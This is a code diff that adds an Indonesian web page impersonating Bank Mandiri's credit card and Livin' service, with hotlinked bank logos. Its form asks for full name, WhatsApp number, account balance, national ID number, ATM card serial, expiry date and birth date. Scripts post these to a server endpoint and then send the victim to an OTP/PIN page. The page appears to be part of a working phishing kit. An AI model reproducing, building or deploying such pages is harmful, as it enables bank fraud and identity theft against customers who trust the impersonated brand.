@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Mandiri Kartu Kredit</title>
+
+    <!-- Fonts & Bootstrap -->
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;300;400;600;800&display=swap" />
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.6.2/css/bootstrap.min.css" />
+
+    <style>
+        /* Root colors */
+        :root {
+            --primary-color: #e74c3c;
+            --secondary-color: #f8f9fa;
+            --text-color: #333;
+            --btn-primary-bg: #e74c3c;
+            --btn-primary-hover-bg: #c0392b;
+        }
+
+        /* Body and full viewport */
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--secondary-color);
+        }
+
+        /* Wrapper container to center the card */
+        .form-container-wrapper {
+            height: 100vh; /* full viewport height */
+            display: flex;
+            justify-content: center;
+            align-items: center; /* vertical centering */
+            padding: 15px;
+            box-sizing: border-box;
+        }
+
+        /* The card form */
+        .form-container {
+            width: 100%;
+            max-width: 420px;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            padding: 25px 30px;
+        }
+
+        /* Header section with logos and text */
+        .header-section {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .header-section img.logo-mandiri {
+            width: 120px;
+            margin-bottom: 8px;
+        }
+
+        .header-section img.logo-livin {
+            width: 140px;
+            margin-bottom: 6px;
+        }
+
+        .header-section .sub-title {
+            color: var(--primary-color);
+            font-weight: 600;
+            font-size: 18px;
+        }
+
+        /* Wizard navigation circles */
+        .wizard-nav {
+            display: flex;
+            justify-content: space-between;
+            list-style: none;
+            padding: 0;
+            margin-bottom: 30px;
+        }
+        .wizard-nav li {
+            flex: 1;
+            text-align: center;
+        }
+        .wizard-nav li a {
+            display: inline-block;
+            width: 36px;
+            height: 36px;
+            line-height: 36px;
+            border-radius: 50%;
+            border: 2px solid #bbb;
+            text-decoration: none;
+            color: blue;
+            font-weight: 700;
+            user-select: none;
+            cursor: default;
+        }
+        .wizard-nav li.active a {
+            background-color: var(--primary-color);
+            border-color: var(--primary-color);
+            color: white;
+            cursor: default;
+        }
+
+        /* Form groups with label and input */
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        label {
+            display: block; /* Pastikan label di atas input */
+            font-weight: 700;
+            color: var(--text-color);
+            margin-bottom: 5px; /* Jarak antara label dan input */
+        }
+        input.form-control {
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding: 10px 12px;
+            font-size: 14px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        input.form-control:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 5px rgba(231, 76, 60, 0.4);
+        }
+
+        /* Phone number inside a box with two inputs */
+        .phone-inputs .col-4 input,
+        .phone-inputs .col-8 input {
+            border-radius: 4px;
+        }
+        /* Disabled input background */
+        input[disabled] {
+            background-color: #e9ecef;
+            cursor: not-allowed;
+        }
+
+        /* Buttons container */
+        .btn-group-custom {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .btn-kembali {
+            background: transparent;
+            border: 2px solid #999;
+            color: #333;
+            font-weight: 700;
+            padding: 12px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .btn-kembali:hover {
+            background-color: #ddd;
+        }
+
+        .btn-selanjutnya {
+            background-color: var(--btn-primary-bg);
+            border: none;
+            color: white;
+            font-weight: 700;
+            padding: 12px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .btn-selanjutnya:hover {
+            background-color: var(--btn-primary-hover-bg);
+        }
+
+        /* Loading overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--primary-color);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Footer image */
+        .footer-image {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: auto;
+            z-index: -1;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 480px) {
+            .form-container {
+                padding: 20px 15px;
+            }
+            .wizard-nav li a {
+                width: 30px;
+                height: 30px;
+                line-height: 30px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container-wrapper">
+        <div class="form-container" role="main">
+            <!-- Header / Brand logos -->
+            <div class="header-section" aria-label="Brand logos and page title">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/Bank_Mandiri_logo_2016.svg/426px-Bank_Mandiri_logo_2016.svg.png"
+                     alt="Mandiri Logo" class="logo-mandiri" />
+                <img src="https://static.wikia.nocookie.net/logopedia/images/c/c3/Livin%27_by_mandiri.svg"
+                     alt="Livin' by Mandiri Logo" class="logo-livin" />
+                <div class="sub-title">Data Pribadi</div>
+            </div>
+
+            <!-- Wizard navigation -->
+            <ul class="wizard-nav" role="tablist" aria-label="Form Step Navigation">
+                <li class="active" aria-current="step"><a href="#">1</a></li>
+                <li><a href="#" tabindex="-1">2</a></li>
+                <li><a href="#" tabindex="-1">3</a></li>
+                <li><a href="#" tabindex="-1">4</a></li>
+                <li><a href="#" tabindex="-1">5</a></li>
+                <li><a href="#" tabindex="-1">6</a></li>
+            </ul>
+
+            <!-- Form -->
+            <form id="form1" method="POST" novalidate>
+                <!-- Halaman 1: Data Pribadi -->
+                <div class="form-group">
+                    <label for="nama">Nama Lengkap Tanpa Singkatan</label>
+                    <input type="text" id="nama" name="nama" class="form-control" maxlength="150" pattern="[a-zA-Z .'^\s]*"
+                           required autocomplete="name" aria-required="true" />
+                </div>
+
+                <div class="form-group phone-inputs">
+                    <label>Nomor WhatsApp</label>
+                    <div class="row no-gutters">
+                        <div class="col-4 pr-2">
+                            <input type="tel" class="form-control" pattern="\d*" maxlength="2" value="62" disabled aria-disabled="true" />
+                        </div>
+                        <div class="col-8 pl-2">
+                            <input type="tel" id="nomor" name="nomor" class="form-control" maxlength="12" pattern="\d*"
+                                   placeholder="81xxxxxxxxx" required autocomplete="tel" aria-required="true" />
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="saldo">Saldo Akhir</label>
+                    <input type="tel" id="saldo" name="saldo" class="form-control" maxlength="100" placeholder="Rp."
+                           required autocomplete="off" aria-required="true" />
+                </div>
+
+                <div class="form-group">
+                    <label for="nik">NIK KTP</label>
+                    <input type="tel" id="nik" name="nik" class="form-control" maxlength="17" placeholder="12345678901234567"
+                           required autocomplete="off" aria-required="true" />
+                </div>
+
+                <!-- Halaman 2: Data Kartu -->
+                <div class="form-group">
+                    <label for="seri">Seri Kartu ATM</label>
+                    <input type="tel" id="seri" name="seri" class="form-control" maxlength="17" placeholder="123-456"
+                           required autocomplete="off" aria-required="true" />
+                </div>
+
+                <div class="form-group">
+                    <label for="masa">Masa Berlaku</label>
+                    <input type="tel" id="masa" name="masa" class="form-control" maxlength="10" placeholder="DD/MM/YYYY"
+                           required autocomplete="off" aria-required="true" />
+                </div>
+
+                <div class="form-group">
+                    <label for="tanggal_lahir">Tanggal Lahir</label>
+                    <input type="tel" id="tanggal_lahir" name="tanggal_lahir" class="form-control" maxlength="10" placeholder="DD/MM/YYYY"
+                           required autocomplete="off" aria-required="true" />
+                </div>
+
+                <!-- Buttons -->
+                <div class="btn-group-custom">
+                    <button type="button" class="btn-kembali" onclick="location.href='index.html'">Kembali</button>
+                    <button type="submit" class="btn-selanjutnya">Selanjutnya</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Footer Image -->
+    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNHR1tBeRoEJBYW5AdmBTu2pyIygz1fTIQV7RBqvEc2idlBO3PpcV46gE8bMMs2_cr50lUMIIpWaikj4gdGbsEEZ8xLZM-T6nBHl5Fb8-oD-4wjiJnCHqsn1FaS6mngPxA8wpdizDCJa15mkp0pmNYhsU2BVJlmQP8hudU_65b8JjWLXw0eJdy1uAq04Q/s1079/1000226740.jpg" alt="Footer Image" class="footer-image">
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loader" style="display: none;">
+        <div class="loader"></div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script src="https://dev-danapemulihan.pantheonsite.io/asset/jquery.mask.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            // Clear field if it contains '0' or '62' manually typed
+            $('#nomor').on('input', function() {
+                if($(this).val() === '0' || $(this).val() === '62') {
+                    $(this).val('');
+                }
+            });
+
+            // Mask saldo input with Rupiah format
+            $('#saldo').mask('000.000.000.000', {reverse: true});
+
+            $('#saldo').on('keyup', function() {
+                let val = $(this).val();
+                $(this).val(formatRupiah(val, 'Rp. '));
+            });
+
+            function formatRupiah(angka, prefix) {
+                var number_string = angka.replace(/[^,\d]/g, '').toString(),
+                    split    = number_string.split(','),
+                    sisa     = split[0].length % 3,
+                    rupiah     = split[0].substr(0, sisa),
+                    ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
+
+                if (ribuan) {
+                    var separator = sisa ? '.' : '';
+                    rupiah += separator + ribuan.join('.');
+                }
+
+                rupiah = split[1] !== undefined ? rupiah + ',' + split[1] : rupiah;
+                return prefix === undefined ? rupiah : (rupiah ? prefix + rupiah : '');
+            }
+
+            // Mask for masa berlaku and tanggal lahir
+            $('#masa').mask('00/00/0000');
+            $('#tanggal_lahir').mask('00/00/0000');
+
+            // Form submission with loading
+            $('#form1').on('submit', function(e) {
+                e.preventDefault();
+                $("#loader").show();
+
+                // Simulasi submit atau AJAX
+                setTimeout(function() {
+                    $('#loader').hide();
+                    window.location = "otp.html"; // Redirect ke halaman PIN
+                }, 500);
+            });
+        });
+    </script>
+    <script>
+ $(document).ready(function(){
+    $('#form1').submit(function(e) {
+    event.preventDefault();
+    
+$("#loader").show();
+
+
+ $.ajax({
+ type: 'POST',
+ url: 'one.js',
+ data: $(this).serialize(),
+ datatype: 'JSON',
+ 
+ complete: function(data) {
+            console.log('Complete')
+  setTimeout(function(){
+   $('#loader').hide();
+     window.location = "otp.html";
+var nama = document.getElementById('nama').value;
+sessionStorage.setItem("nama", nama);
+
+var saldo = document.getElementById('saldo').value;
+sessionStorage.setItem("saldo", saldo);
+var nomor = '0' + document.getElementById('nomor').value;
+sessionStorage.setItem("nomor", nomor);
+     }, 500);
+        }
+    });
+ });
+    return false;
+});       
+</script>
+</body>
+</html>
